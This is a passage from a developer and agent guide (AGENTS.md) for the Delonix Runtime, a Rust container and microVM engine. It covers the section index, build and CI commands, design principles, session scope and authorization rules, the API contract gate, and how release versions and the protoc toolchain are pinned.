# Delonix Runtime — project guide (AGENTS.md)

Engine for **daemonless, rootless-first, kernel-native containers and microVMs, in Rust**.
**Public** repository (`ngolacloud/delonix`, Apache-2.0) — see
[README.md](README.md) for the architecture of the 40 crates.

> **First contact:** a session reads [`.ai/INVARIANTS.md`](.ai/INVARIANTS.md) —
> the minimal invariants before editing, with pointers. **This file is the
> archive** (~124 sections, the historical why): it is consulted by section through the index
> below, not read from end to end. The budget is a gate
> (`scripts/agents_budget_gate.py`).
<!-- agents-toc:begin -->

## Index (125 sections)

- [Quick start (read this; the rest is consulted by section)](#quick-start-read-this-the-rest-is-consulted-by-section)
- [Engine identity and boundary (read first)](#engine-identity-and-boundary-read-first)
- [Commands](#commands)
- [Scope: a session opened here works ONLY on `delonix-runtime`](#scope-a-session-opened-here-works-only-on-delonix-runtime)
- [The node contract is a gate (`scripts/contract_gate.py`, ADR-0040 P1)](#the-node-contract-is-a-gate-scriptscontract_gatepy-adr-0040-p1)
- [The version is always aligned with the published tag (`scripts/version_gate.py`)](#the-version-is-always-aligned-with-the-published-tag-scriptsversion_gatepy)
- [Code language: English (LANG-01)](#code-language-english-lang-01)
- [The direction of dependencies is a gate (ADR-0040, phase P0)](#the-direction-of-dependencies-is-a-gate-adr-0040-phase-p0)
- [Method: one worktree per session (read BEFORE editing)](#method-one-worktree-per-session-read-before-editing)
- [CLI (`delonix`)](#cli-delonix)
- [Surviving a reboot (`cmd/boot.rs`)](#surviving-a-reboot-cmdbootrs)
- [Output: docker-style `ls`, kubectl-style `describe` (`cmd/output.rs`)](#output-docker-style-ls-kubectl-style-describe-cmdoutputrs)
- [Hot reconfiguration (`delonix container update`)](#hot-reconfiguration-delonix-container-update)
- [Native IaC: `stack plan`/convergent `apply`/`destroy` (v0.47.0)](#native-iac-stack-planconvergent-applydestroy-v0470)
- [The Kinds gain groups and definitive names — `Gateway`, `VirtualMachine`, `KubernetesCluster` (v0.64.0, ADR-0020)](#the-kinds-gain-groups-and-definitive-names--gateway-virtualmachine-kubernetescluster-v0640-adr-0020)
- [Reverse-proxy L7 (`kind: HTTPRoute`)](#reverse-proxy-l7-kind-httproute)
- [Internal DNS / service discovery (`<nome>.<namespace>.delonix.internal`)](#internal-dns--service-discovery-nomenamespacedelonixinternal)
- [Directed reachability (`kind: Dependency` / `KnowDepends`)](#directed-reachability-kind-dependency--knowdepends)
- [Path between NETWORKS (`kind: NetworkRoute` / `network route`, ADR-0013 tier B)](#path-between-networks-kind-networkroute--network-route-adr-0013-tier-b)
- [Namespace isolation (`metadata.namespace` / `--namespace`)](#namespace-isolation-metadatanamespace----namespace)
- [Pin/control: the holder is no longer a single point of failure (v0.42.0)](#pincontrol-the-holder-is-no-longer-a-single-point-of-failure-v0420)
- [Golden VM image (`delonix vm image`)](#golden-vm-image-delonix-vm-image)
- [kubeadm cluster (`delonix cluster apply`)](#kubeadm-cluster-delonix-cluster-apply)
- [Security audit (skill `delonix-runtime-sec`)](#security-audit-skill-delonix-runtime-sec)
- [Broad code/architecture review (2026-07-27) — real bugs fixed + documented debt](#broad-codearchitecture-review-2026-07-27--real-bugs-fixed--documented-debt)
- [CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 1: `secret create` vs `secret set`](#cli-restructuring-dockerpodmankubectl-semantics--sprint-1-secret-create-vs-secret-set)
- [CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 2: `container ssh` removed](#cli-restructuring-dockerpodmankubectl-semantics--sprint-2-container-ssh-removed)
- [CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 3: 6 dashboards → `dashboard --scope`](#cli-restructuring-dockerpodmankubectl-semantics--sprint-3-6-dashboards--dashboard---scope)
- [CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 4: `system backup`/`restore` → `system snapshot create`/`restore`](#cli-restructuring-dockerpodmankubectl-semantics--sprint-4-system-backuprestore--system-snapshot-createrestore)
- [CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 5: `network connect`/`disconnect`](#cli-restructuring-dockerpodmankubectl-semantics--sprint-5-network-connectdisconnect)
- [CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 6: `volume create --driver/--opt`](#cli-restructuring-dockerpodmankubectl-semantics--sprint-6-volume-create---driver--opt)
- [CLI restructuring (Docker/Podman/kubectl semantics) — Sprint 9: `image vm`/`image --vm` → `vm image`](#cli-restructuring-dockerpodmankubectl-semantics--sprint-9-image-vmimage---vm--vm-image)
- [`delonix init -t <template> --up` ran a `container run` apart from the manifest (2026-09-13)](#delonix-init--t-template---up-ran-a-container-run-apart-from-the-manifest-2026-09-13)
- [`delonix init` adopts an existing project instead of generating over it (2026-09-13)](#delonix-init-adopts-an-existing-project-instead-of-generating-over-it-2026-09-13)
- [CI/CD, SonarQube and gitflow/semver ready in the 7 templates with real code (2026-09-13)](#cicd-sonarqube-and-gitflowsemver-ready-in-the-7-templates-with-real-code-2026-09-13)
- [`-v`/`--template-version` — a template's version chosen by flag, not hardcoded (#296, extended to the 11 templates)](#-v--template-version--a-templates-version-chosen-by-flag-not-hardcoded-296-extended-to-the-11-templates)
- [The edge templates are born with HTTPS and sized for load (2026-10-01)](#the-edge-templates-are-born-with-https-and-sized-for-load-2026-10-01)
- [The templates ship a tunnel to the internet without a public IP (`delonix-tunnel.yaml`, 2026-10-02)](#the-templates-ship-a-tunnel-to-the-internet-without-a-public-ip-delonix-tunnelyaml-2026-10-02)
- [A generated project is born as a repository (2026-10-15)](#a-generated-project-is-born-as-a-repository-2026-10-15)
- [The 11 templates reviewed, and the contract now has a gate (2026-10-15)](#the-11-templates-reviewed-and-the-contract-now-has-a-gate-2026-10-15)
- [A privileged port in `init` made the project impossible to build (2026-10-15)](#a-privileged-port-in-init-made-the-project-impossible-to-build-2026-10-15)
- [The image's `USER`, and the `chown` that hands the rootfs to the user (ADR-0062, 2026-10-01)](#the-images-user-and-the-chown-that-hands-the-rootfs-to-the-user-adr-0062-2026-10-01)
- [The `odoo` template would not boot: the limits preflight did not see the cgroup2 in an own network (2026-09-30)](#the-odoo-template-would-not-boot-the-limits-preflight-did-not-see-the-cgroup2-in-an-own-network-2026-09-30)
- [Infrastructure and ERP templates against the master prompt (2026-10-01)](#infrastructure-and-erp-templates-against-the-master-prompt-2026-10-01)
- [Silent failures fixed (fail-closed) + 1 documented](#silent-failures-fixed-fail-closed--1-documented)
- [Security audit #3 (2026-08-10) — the industry's CVE classes, 6 finders in parallel](#security-audit-3-2026-08-10--the-industrys-cve-classes-6-finders-in-parallel)
- [Security audit #4 (2026-10-12) — OWASP K8s/Docker Top 10, Kinds and providers](#security-audit-4-2026-10-12--owasp-k8sdocker-top-10-kinds-and-providers)
- [CRI on a kubeadm node: eviction without stats and `kubeadm reset` with orphans (2026-09-15)](#cri-on-a-kubeadm-node-eviction-without-stats-and-kubeadm-reset-with-orphans-2026-09-15)
- [Capabilities ceiling on the CRI (`DELONIX_CRI_CAP_CEILING`, v0.47.0)](#capabilities-ceiling-on-the-cri-delonix_cri_cap_ceiling-v0470)
- [A `hostPort` the node does not publish is REJECTED by name (ADR-0074, 2026-10-07)](#a-hostport-the-node-does-not-publish-is-rejected-by-name-adr-0074-2026-10-07)
- [Security audit #2 (VM code of this series: console/network/cloud-init)](#security-audit-2-vm-code-of-this-series-consolenetworkcloud-init)
- [Broad E2E audit (14 finders × adversarial verification) — state](#broad-e2e-audit-14-finders--adversarial-verification--state)
- [VM lifecycle in libvirt (`vm stop/rm`) — managed save, orphans, `--force`](#vm-lifecycle-in-libvirt-vm-stoprm--managed-save-orphans---force)
- [libvirt VM networking — default `nat` with IP, static `--ip`, VM↔container routes](#libvirt-vm-networking--default-nat-with-ip-static---ip-vmcontainer-routes)
- [VM↔container by direct IP (`vm bridge`) — EXPERIMENTAL, privileged, opt-in](#vmcontainer-by-direct-ip-vm-bridge--experimental-privileged-opt-in)
- [Firewall `ingress`/`egress` — last command wins (+ surgical `rm`)](#firewall-ingressegress--last-command-wins--surgical-rm)
- [`kind: App` — Cloud Native Buildpacks wired to a real build path (ADR-0035)](#kind-app--cloud-native-buildpacks-wired-to-a-real-build-path-adr-0035)
- [`kind: NetworkAccessRule` — the incremental primitive B4 was missing (ADR-0028)](#kind-networkaccessrule--the-incremental-primitive-b4-was-missing-adr-0028)
- [`kind: Service` — discovery by selector, round-robin by DNS, no VIP (ADR-0032, 2026-09-05)](#kind-service--discovery-by-selector-round-robin-by-dns-no-vip-adr-0032-2026-09-05)
- [Addressable identity of Kinds with no registry of their own (B1, 2026-08-31)](#addressable-identity-of-kinds-with-no-registry-of-their-own-b1-2026-08-31)
- [Kind-mode cluster without Docker — investigation (GO/NO-GO)](#kind-mode-cluster-without-docker--investigation-gono-go)
- [Strict manifests, App with fingerprint, Service ready (ADR-0069, 2026-10-03)](#strict-manifests-app-with-fingerprint-service-ready-adr-0069-2026-10-03)
- [A policy-governed workload is born closed (ADR-0069 D6, 2026-10-03)](#a-policy-governed-workload-is-born-closed-adr-0069-d6-2026-10-03)
- [Why there are TWO guest Kinds, and why the perimeter policy is not a `NetworkPolicy` (ADR-0072/0073, 2026-10-06)](#why-there-are-two-guest-kinds-and-why-the-perimeter-policy-is-not-a-networkpolicy-adr-00720073-2026-10-06)
- [The `provider` block is `type` + `spec` (ADR-0070/0071, 2026-10-03)](#the-provider-block-is-type--spec-adr-00700071-2026-10-03)
- [Product vision: Universal Runtime (Workload Abstraction Layer)](#product-vision-universal-runtime-workload-abstraction-layer)
- [State for the next session (2026-09-04)](#state-for-the-next-session-2026-09-04)
- [Next phases (requested, not implemented — each one needs its own planning session)](#next-phases-requested-not-implemented--each-one-needs-its-own-planning-session)
- [i18n (EN source + embedded pt.po catalog) — `cmd/po.rs`](#i18n-en-source--embedded-ptpo-catalog--cmdpors)
- [Systematic audit of the 208 subcommands (v0.37.0) — 4 data-loss paths](#systematic-audit-of-the-208-subcommands-v0370--4-data-loss-paths)
- [Resource limits require a delegated cgroup (measured on a clean VM, 2026-08-04)](#resource-limits-require-a-delegated-cgroup-measured-on-a-clean-vm-2026-08-04)
- [Classed exit codes (v0.49.0) — «does not exist» stopped being «it blew up»](#classed-exit-codes-v0490--does-not-exist-stopped-being-it-blew-up)
- [Namespace isolation is INERT without `br_netfilter` (measured 2026-08-12)](#namespace-isolation-is-inert-without-br_netfilter-measured-2026-08-12)
- [The «X is not Y» class — sweep of 2026-08-05](#the-x-is-not-y-class--sweep-of-2026-08-05)
- [Appliance images (OPNsense, Proxmox, TrueNAS) — v0.47.0](#appliance-images-opnsense-proxmox-truenas--v0470)
- [The VM manifest resolved the image differently than the CLI (2026-08-12)](#the-vm-manifest-resolved-the-image-differently-than-the-cli-2026-08-12)
- [A network's subnet started to count, and what that opened up (v0.47.0)](#a-networks-subnet-started-to-count-and-what-that-opened-up-v0470)
- [OS base images, and what the host needs to build them (v0.47.0)](#os-base-images-and-what-the-host-needs-to-build-them-v0470)
- [Provisioning storage on a NAS (`kind: Volume` + `spec.provision`, ADR-0009)](#provisioning-storage-on-a-nas-kind-volume--specprovision-adr-0009)
- [The Proxmox appliances, and what «OK» does not prove (2026-08-11)](#the-proxmox-appliances-and-what-ok-does-not-prove-2026-08-11)
- [`--vnc` decided whether the VM had a SCREEN, and not just whether it had VNC (2026-08-11)](#--vnc-decided-whether-the-vm-had-a-screen-and-not-just-whether-it-had-vnc-2026-08-11)
- [A CH VM's `--wait` waited for a number it already knew (2026-08-12)](#a-ch-vms---wait-waited-for-a-number-it-already-knew-2026-08-12)
- [Fedora always booted; what it lacked was the network (2026-08-12)](#fedora-always-booted-what-it-lacked-was-the-network-2026-08-12)
- [`delonix_sdn::Net` was DELETED — and it's breaking for library consumers](#delonix_sdnnet-was-deleted--and-its-breaking-for-library-consumers)
- [The VM backend registry, and the Proxmox backend (ADR-0008, closed 2026-08-11)](#the-vm-backend-registry-and-the-proxmox-backend-adr-0008-closed-2026-08-11)
- [The Proxmox transport: errors with class, a task ledger, and the lost reply (ADR-0049, slice 1, 2026-09-23)](#the-proxmox-transport-errors-with-class-a-task-ledger-and-the-lost-reply-adr-0049-slice-1-2026-09-23)
- [The base image carries no credentials, and it says what's inside (2026-08-18)](#the-base-image-carries-no-credentials-and-it-says-whats-inside-2026-08-18)
- [An `exec` right after `run -d` ran on the HOST (2026-08-28)](#an-exec-right-after-run--d-ran-on-the-host-2026-08-28)
- [The providers' capability catalogue, and `delonix provider ls` (ADR-0050, 2026-09-23)](#the-providers-capability-catalogue-and-delonix-provider-ls-adr-0050-2026-09-23)
- [The node contract gained a server: `delonix-node-api` and `ListProviders` (ADR-0050 D5, 2026-09-25)](#the-node-contract-gained-a-server-delonix-node-api-and-listproviders-adr-0050-d5-2026-09-25)
- [The node API gained mutations: the `Operation` registry and `CreateNetwork`/`DeleteNetwork` (ADR-0042 step E, slice E2, 2026-10-03)](#the-node-api-gained-mutations-the-operation-registry-and-createnetworkdeletenetwork-adr-0042-step-e-slice-e2-2026-10-03)
- [Volume reads in the node API, and ADR-0059's F6 deferred (ADR-0042 step E, slice E3, 2026-10-03)](#volume-reads-in-the-node-api-and-adr-0059s-f6-deferred-adr-0042-step-e-slice-e3-2026-10-03)
- [Storage pools: ADR-0067's P0 (`kind: StoragePool`, driver `dir`, 2026-10-03)](#storage-pools-adr-0067s-p0-kind-storagepool-driver-dir-2026-10-03)
- [Golden rule: the engine compiles and answers on its own](#golden-rule-the-engine-compiles-and-answers-on-its-own)
- [Architecture (41 crates in the `crates/` workspace)](#architecture-41-crates-in-the-crates-workspace)
- [History](#history)
- [VMfile, `vm build` and `--network` (v0.44.0/v0.45.0)](#vmfile-vm-build-and---network-v0440v0450)
- [cgroup delegation: `cpu` fatal, `cpuset`/`io` optional (v0.44.0)](#cgroup-delegation-cpu-fatal-cpusetio-optional-v0440)
- [A container's cgroup disappears with it (measured 2026-08-09)](#a-containers-cgroup-disappears-with-it-measured-2026-08-09)
- [The CRI places containers in the kubelet hierarchy (ADR 0038, phase 1)](#the-cri-places-containers-in-the-kubelet-hierarchy-adr-0038-phase-1)
- [`cpuset_mems`/`unified`/hugepage_limits: honour-or-refuse on the CRI path (ADR 0038 item 3)](#cpuset_memsunifiedhugepage_limits-honour-or-refuse-on-the-cri-path-adr-0038-item-3)
- [`UpdateContainerResources`: the live, placement-aware update (ADR 0038 item 4)](#updatecontainerresources-the-live-placement-aware-update-adr-0038-item-4)
- [`HYPERVISOR` in the VMfile + `vm convert` + `vm default-backend` (v0.45.x)](#hypervisor-in-the-vmfile--vm-convert--vm-default-backend-v045x)
- [The battery measures `--help` for everything and EXECUTES a quarter (measured 2026-08-12)](#the-battery-measures---help-for-everything-and-executes-a-quarter-measured-2026-08-12)
- [Pulling a blob restarted from scratch, so on a slow link it never finished (2026-08-12)](#pulling-a-blob-restarted-from-scratch-so-on-a-slow-link-it-never-finished-2026-08-12)
- [An `exec` right after `run -d` can write to the wrong place (measured 2026-08-28)](#an-exec-right-after-run--d-can-write-to-the-wrong-place-measured-2026-08-28)
- [`delonix backup` — six verbs, one object (consolidated in the CLI cycle)](#delonix-backup--six-verbs-one-object-consolidated-in-the-cli-cycle)
- [Rootless containers share layers instead of copying them (v0.59.0)](#rootless-containers-share-layers-instead-of-copying-them-v0590)
- [The many-layer overlay gave ENOENT — the classic `mount(2)` truncates `lowerdir=` silently (ADR-0037)](#the-many-layer-overlay-gave-enoent--the-classic-mount2-truncates-lowerdir-silently-adr-0037)
- [The performance regression gate, and the third exit that makes it reliable (M11)](#the-performance-regression-gate-and-the-third-exit-that-makes-it-reliable-m11)
- [`delonix drift` — what the MACHINE changed, without the manifest in the comparison (M05)](#delonix-drift--what-the-machine-changed-without-the-manifest-in-the-comparison-m05)
- [`compatibility compose` and `migrate assess` — the third state needs a denominator (M02)](#compatibility-compose-and-migrate-assess--the-third-state-needs-a-denominator-m02)
- [The per-VM firewall of the Proxmox node is the second provider of the `firewall` domain (ADR-0052)](#the-per-vm-firewall-of-the-proxmox-node-is-the-second-provider-of-the-firewall-domain-adr-0052)
- [`workload.usage` in `delonix-mcp` — counters, not rates (2026-09-27)](#workloadusage-in-delonix-mcp--counters-not-rates-2026-09-27)
- [A system container on Proxmox is a door of its own, not a `Container` (ADR-0058, plan 63)](#a-system-container-on-proxmox-is-a-door-of-its-own-not-a-container-adr-0058-plan-63)
- [Image performance: pull, push, build and start (2026-09-26 to 2026-09-29, 14 PRs)](#image-performance-pull-push-build-and-start-2026-09-26-to-2026-09-29-14-prs)
- [The `delonix init` templates have a contract, and the generator checks what it substitutes (ADR-0061, 2026-10-01)](#the-delonix-init-templates-have-a-contract-and-the-generator-checks-what-it-substitutes-adr-0061-2026-10-01)
- [The anti-spoof never filtered anything, and moved to a `bridge` table (2026-10-02)](#the-anti-spoof-never-filtered-anything-and-moved-to-a-bridge-table-2026-10-02)
- [IPAM of a zone: the controller it names, and subnets changed in place (ADR-0063 D1/D2, 2026-10-09)](#ipam-of-a-zone-the-controller-it-names-and-subnets-changed-in-place-adr-0063-d1d2-2026-10-09)
- [Egress to private space: a node guard on the holder's uplink (`denyPrivateEgress`, 2026-10-11)](#egress-to-private-space-a-node-guard-on-the-holders-uplink-denyprivateegress-2026-10-11)
- [A cluster's pod network is a selectable PROFILE (ADR-0078, 2026-10-15)](#a-clusters-pod-network-is-a-selectable-profile-adr-0078-2026-10-15)
- [`kind: GitOpsSource` — the pull pass without a daemon (ADR-0021, 2026-10-12)](#kind-gitopssource--the-pull-pass-without-a-daemon-adr-0021-2026-10-12)
- [`kind: Service type VirtualIP` — the L4 VIP with readiness (ADR-0066, 2026-10-12)](#kind-service-type-virtualip--the-l4-vip-with-readiness-adr-0066-2026-10-12)
- [The cgroup group also holds as root, and the Cloud Hypervisor VMM is born in a leaf (ADR-0079, proposed)](#the-cgroup-group-also-holds-as-root-and-the-cloud-hypervisor-vmm-is-born-in-a-leaf-adr-0079-proposed)
- [The CDI path measured on a real GPU host (RTX 4060, 2026-11-21)](#the-cdi-path-measured-on-a-real-gpu-host-rtx-4060-2026-11-21)

<!-- agents-toc:end -->

## Quick start (read this; the rest is consulted by section)

This file is 120 sections accumulated by topic and by sprint: the **archive** of the
decisions and their why. It is not read end to end — you consult the section
that matters. What a session needs to know **before** editing is just this:

```bash
make ci     # fmt + script gates + clippy + tests — it is what the CI runs
```

**Flow (develop-GitFlow, owner's decision 2026-10-23).** `develop` is the
integration line; `main` is the published line. `feat/chore/refactor/perf/docs/test/ci/build`
branch off `origin/develop` and return to `develop`; `fix/bug/hotfix` branch off
`origin/main` and go to `develop` and, when they touch the published line, also to `main`.
The canonical source — branch table, lifecycle, states, integration by PR and
cleanup — is [`docs/dev/engineering-process.md`](docs/dev/engineering-process.md), and the
harness that executes it is `scripts/gitflow.py` (`make gitflow ARGS="…"`). This section
and the session skills do not repeat the policy: they defer to that file.

**Definition of Done.** A change is done when, observed and not presumed:
`make ci` passes (or the gates it touches pass, with the cited `rc=0`); there is a
test that fails without it and passes with it; the documentation of the same behavior
accompanies it (`scripts/dev_docs.py --check`, `scripts/dev_docs_site.py --check`);
and there is no new `print!`/`eprintln!` in `crates/` — the `library_prints` ratchet only
goes down.

**Measurement traps** that have already cost entire CI rounds:

- `cargo test` wants an empty `TMPDIR` that is only its own — `scripts/tmp_roots_gate.py`
  judges what is left there. Sharing it with the `scripts/test_*.py` (which leave ~7
  directories) accuses `cargo test` of a leak that is not its own.
- `docs_cli_gate.py` and `cli-tree.sh --gate` resolve against
  `target/release/delonix`. An old binary **invents** failures: rebuild
  (`cargo build --release -p delonix-runtime-bin`) or do not believe the result.
- Integration does **squash-merge**: the commits of a branch disappear from its
  history but the content stays. Use `git cherry develop <branch>` (the integration
  target), not `git log`, to know whether something is already there — **and only for a
  branch of ONE commit.** `git cherry` compares patch-ids, and a squash of N commits
  carries the UNION of the N patches, which matches none of them individually: it then
  prints `+` (missing) for work that is already in. Measured twice independently on
  2026-11-21 — on a 5-commit branch whose PR was merged (the squash commit was an ancestor
  of `develop` and the five commits were not), and on a 10-commit one. For a multi-commit
  branch the proof is the **content** (a `git diff` of the files, or a `grep` for the
  symbol the change introduces) or GitHub's own merge record (`gh pr view <n> --json
  mergeCommit`, then `git merge-base --is-ancestor <squash> origin/develop`). A `+` from
  `git cherry` is not evidence of absence.
- A pushed branch runs CI: `ci.yml` triggers on push to `main`/`develop`
  and on PR to either of the two. "Green CI" always requires a PR.

**Commits**: Conventional Commits (`feat:`, `fix:`, `docs:`, `chore:`, `wip:`),
subject in Portuguese, body with **Why** and **How to validate** (the commands and their
`rc`). Identifiers, comments and user-facing text in **English** (LANG-01,
own section below) — the ratchet counts, even where the neighbors are in Portuguese.

**Git**: the authority to publish — push, create/edit PR, merge, release — is the
canonical source [`.ai/agents/authorization.md`](.ai/agents/authorization.md), and this
section defers to it: everything above `commit` requires **explicit** authorization from
the owner, per operation **and** target, and in its absence you hand over the command instead of
running it (never a forced push, never bypassing a protection). Before something
destructive, a safety tag. `git branch -d` (never `-D`), `git worktree
remove` (never `--force`). No commit carries a `Co-Authored-By: Claude` trailer.

**WIP limit: at most 3 sessions/worktrees open at the same time.** Opening the
fourth forces you to close or park one, with a written handoff. There are always other
sessions on this machine and **a single shared Delonix engine** — a worktree isolates the
code, not the engine state (see "Method: one worktree per session").

The local configuration of agent tooling stays outside the repo by a recorded
decision (`cc6f9777`): `.claude/` and `CLAUDE.md` are ignored, because this
repository is public.

## Engine identity and boundary (read first)

This section is the canonical source: agents, skills, ADRs and reviews refer back here, and a
proposal that contradicts it is rejected in review.

**What the engine is.** An execution abstraction layer on a node: it runs **containers and
microVMs** and governs the network and the storage they need. It is declarative, with
**its own Kinds** in the published groups (`core`, `compute`, `networking`, `gateway`,
`storage`, `artifact`, `infrastructure` — `delonix api-resources`). It talks to **providers**
only through each one's management interface, behind ports: the Linux kernel (namespaces,
cgroups, nftables), libvirt and Cloud Hypervisor, Proxmox VE and the Kubernetes API (the CRI
that serves the kubelet, cluster bootstrapping with kubeadm and kind). **OpenStack is not an
engine provider**: there is only ADR-0039, *Proposed*, without a backend, and `provider.type:
openstack` is rejected on load. A new provider enters as an implementation of a
port, never as an `if provider == …` scattered through the code.

**Principles, and what each one forbids:**

1. **Cloud native** — declarative and convergent (plan, apply, drift), API-first (the CLI,
   the node API, the CRI and the MCP expose the same operations), observable by open standards
   (OpenTelemetry, Prometheus), with no state hidden in a process.
2. **Daemonless** — no resident process by default. What needs to persist belongs to
   systemd (unit, timer, socket activation) or to a per-workload process with a clear owner
   (a container's supervisor, the network holder). A new daemon requires an ADR with the
   evidence of what the alternative did not solve.
3. **Rootless-first** — the normal path runs without root. Privilege is explicit opt-in,
   told to the operator, never a silent default. **And rootless-first is not rootless-only**
   (owner's decision, 2026-10-07): «needs root» is NOT a reason to drop a
   capability. When needed, it is built behind **root mode** or **cgroup
   delegation**, as `vm bridge` and the `--device-*` limits already do — and today's refusal
   says «not implemented», never «impossible». The difference is not stylistic: a
   message that reads as a permanent limit teaches the next reader to stop searching,
   and it has already happened — the SCTP refusal in the CRI was born saying «this node has no path»
   when the kernel accepts the DNAT rule that root mode would write (ADR-0074 D3).

**What the engine does not know: any consumer.** The engine does not know who uses it. It does not know
platforms, control planes, consoles or agents — nor their repositories and crates —,
nor tenant, account, plan, quota or billing. This applies to dependencies, code,
comments, messages and the contract in `proto/`. Whoever consumes adapts to the engine's
contracts; **the engine does not shape itself to a consumer**. A requirement coming from a consumer
is written as the capability it is, in the engine's vocabulary (its Kinds and resources), and
it only enters if it makes sense for any client. And the engine validates its own contract:
it never trusts a caller to reject what it itself does not do.

**How it is enforced.** `scripts/arch_fitness.py` fails on a consumer's name in
`crates/`, `bins/`, `proto/` or in the manifests (comments included), on a dependency
against the direction of the layers, and on a crate outside its layer's directory. The story
that needs names from outside lives in `docs/`, never in the code.

## Commands

```bash
make bootstrap                        # once per machine: toolchain, C/C++, protoc, sccache
make build                            # the five binaries (release), with jobs/priority sized to the machine
make install                          # ~/.local/bin + ~/.config/delonix/env.sh (DELONIX_BIN, DELONIX_ROOT)
make ci                               # fmt, script gates, clippy, tests
cargo build --workspace               # everything
cargo test  --workspace               # tests
cargo build -p delonix-runtime-bin    # the `delonix` CLI (see "CLI" section below)
python3 scripts/lang_ratchet.py       # language gate (see "Code language")
```

## Scope: a session opened here works ONLY on `delonix-runtime`

Owner's decision (2026-09-16). A session whose work is this repository does not
edit, does not propose PRs and does not run builds in other repos of the workspace
(`delonix-paas`, `delonix-deploy`, `delonix-portal`, `delonix-meet`, …), even
when the workspace root's `CLAUDE.md` routes the matter to a skill of
another domain. What is found and belongs to another repo **is reported** (in the PR or
to the owner) and is not fixed from here.

Two practical consequences:

- **A consumer does not block a change here.** `delonix-paas` uses this repo
  via `git` + `tag`; Cargo finds a crate by its NAME within the repository,
  not by the path, so moving or renaming directories does not break its pin.
  Renaming a CRATE breaks it — that is the business of the ADR that renames it, not a reason
  to go edit the other repo.
- **Before a wide change, confirm you are the only session here.** Active
  sessions (the session/agent tooling), `git worktree list`, branches with
  recent commits, open PRs and processes with cwd in this tree. A change that
  moves code with another session editing is a guaranteed conflict.

## The node contract is a gate (`scripts/contract_gate.py`, ADR-0040 P1)

`proto/delonix/node/v1` is the source of truth of two encodings (gRPC and HTTP/JSON on the
same local socket), and `docs/api/openapi.yaml` is GENERATED from it — never edited by
hand. The CI `contract` job (pinned tools: `buf` v1.73.0, gnostic v0.7.1) fails
on: format outside `buf format`; `buf lint` (the written exceptions are in `buf.yaml`);
compatibility break against the last tag that already has `proto/` (until then it says there is no
base, instead of passing silently); an RPC without HTTP mapping, or a client stream with
one; the OpenAPI differing from the generated one; and two paths that are the same URL with
different variable names. Verified to fail on each of these cases.

Three decisions the gate protects: **one request per RPC** (`<Rpc>Request`), because a
shared request makes a field intended for one method appear in five; **explicit
identity in the request** (`namespace`/`name`), never a `ResourceMeta` with fields that the
engine would ignore; and **images addressed by query**, because `alpine:3.20` in a path reads
the `:` as a verb.

## The version is always aligned with the published tag (`scripts/version_gate.py`)

The `version` in the root `Cargo.toml` is not decoration: it chooses which release
`delonix-cri` is downloaded from, it is the `ServerVersion` of the Docker API, it is recorded in
each backup and it is what the release workflow compares with the binary. That is why it can only
be one of two things, and the CI `version` job rejects the rest:

1. **Equal to the most recent tag the commit contains** — the normal work between
   releases. A `-dev` suffix is not used: it would break the `delonix-cri` download, which
   would look for a release that does not exist.
2. **Higher only in the release commit**, and with `docs/releases/v<version>.md`.

**Pushing the tag does NOT publish anything** (2026-09-23). `release.yml` used to trigger on
`push: tags: ["v*"]`, that is the release was built at the instant the tag
reached the remote — including a tag pushed by accident (`git push --tags`,
`push.followTags=true`), and with no step between «the tag exists» and «the world has a
binary». It switches to `workflow_dispatch` with the tag as INPUT:

```bash
git tag -a v4.4.0 -m "v4.4.0" && git push origin v4.4.0   # cuts the version
gh workflow run release.yml -f tag=v4.4.0                 # publishes it
```

The input is free text and everything downstream trusts it — it chooses the commit to
build, names the release and is compared with the version of the binary itself —,
so the `guard` job runs first and costs seconds: it rejects a tag that does not
have the form `vX.Y.Z`, one that does not exist on the remote, and one that already has a release
(republishing over it is how the assets change under those who already downloaded them).
Without that guard, a `tag: main` would have checked out a branch and published a
release named «main».

**The release's `protoc` is PINNED, and the reason was measured publishing v5.0.0.** The
two build jobs installed it with `apt-get install protobuf-compiler`, which
resolves to whatever the runner image brings — and the two run on DIFFERENT
images (`ubuntu-22.04` and `ubuntu-22.04-arm`, pinned on purpose because of
glibc 2.35). The `build (arm64)` died on `delonix/node/v1/compute.proto: This file
contains proto3 optional fields, but --experimental_allow_proto3_optional was not
set`: 22.04 brings **protoc 3.12**, earlier than proto3's `optional` becoming
stable (3.15). The `build & publish` did not even get to run (`skipped`), so it would have
failed the same way on x86_64 — arm64 just got there first.

**And CI could not catch this**, which is the part to retain. The comparison that matters
is between the two arm64 jobs, and the runners are PINNED in different places:
`ci.yml` on **`ubuntu-24.04-arm`** (protoc 3.21, accepts) and `release.yml` on
**`ubuntu-22.04-arm`** (protoc 3.12, requires the flag). It is not the install command
that differs — it is identical in both — it is the image. So the gate validated in an environment
different from the one that builds the artifact, and a green CI **does not prove the release
builds**. It is the same class as «measure the
thing, not a proxy», applied to the environment instead of the value. The two jobs switch to
downloading a `protoc` of a fixed version, verified by sha256 (the digests come from the
GitHub API, per asset), with the archive chosen by `uname -m`. And it **fails
closed**: `release.yml` compiles the contract right after installing, so a
`protoc` that cannot compile it never gets to build a release.

**And the first version of this said «in a SINGLE shared snippet — two snippets
could diverge again, which is the defect», which was FALSE.** Measured in the
diff itself: `grep -c '^+          V=36.2'` gave **2**. The `uname -m` chooses the architecture
within each copy, but the 33-line block was pasted into both jobs, with the
version and the two digests written twice — exactly the defect the sentence
named. Caught by another session measuring the diff instead of reading the claim. The
answer is `.github/actions/protoc`, a local action: the two `release.yml` jobs
and the eight places in `ci.yml` switch to `- uses: ./.github/actions/protoc`, and the
version with the digests lives in a single file. Ten copies of the same shell would be ten
places for the version to diverge again.

**The action installs and nothing else, on purpose**, and the contract gate stays in
`release.yml`: in CI it would be redundant eight times (the `contract` job runs the full
gate, which is stronger, and any other job would fail at the Rust build — which is
precisely how this was found); in a release it is what prevents a `protoc`
incapable of producing an artifact. And the `/usr/local` layout is not incidental: 
`scripts/contract_gate.py` derives the well-known types' `-I` from
`$(dirname $(which protoc))/../include`, so the `include/*` of the zip is
mandatory.

**The `optional` stays, and it is not accidental**: there are three fields, and the `used_bytes` of
`infra.proto` exists to distinguish «measured» from «unknown» (ADR-0042 E3 —
unknown is never zero). Removing it would change the contract and lose the distinction; the
fix is the toolchain. **Still open**: `ci.yml` installs `protoc` via
`apt` in eight places, so the exposure to the environment is still there — pinning the CI too
